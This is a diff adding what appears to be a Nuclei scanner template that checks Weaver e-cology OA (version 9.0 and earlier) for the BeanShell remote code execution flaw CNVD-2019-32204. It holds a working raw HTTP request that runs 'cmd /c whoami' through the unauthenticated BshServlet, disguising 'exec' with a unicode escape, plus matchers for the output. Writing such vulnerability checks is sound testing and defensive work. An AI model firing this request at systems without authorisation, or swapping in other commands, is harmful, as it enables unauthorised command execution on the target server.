@@ -1,0 +1,38 @@
+id: CNVD-2019-32204
+
+info:
+  name: 泛微OA(Weaver) e-cology - Bsh远程代码执行(CNVD-2019-32204)
+  author: wintrysec
+  severity: critical
+  description: |
+    泛微(Weaver)中大型组织OA软件 e-cology <=9.0 远程代码执行. 
+    远程攻击者可以通过调用BeanShell组件中的未授权访问接口,直接在目标服务器上执行任意命令.
+  remediation: |
+    访问泛微官网获取漏洞补丁.
+  tags: ecology
+
+http:
+  - raw:
+    - |
+        POST /weaver/bsh.servlet.BshServlet HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Language: en
+        User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        bsh.script=ex\u0065c("cmd /c whoami");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "admin"
+          - "root"
+          - "system"
+        condition: or
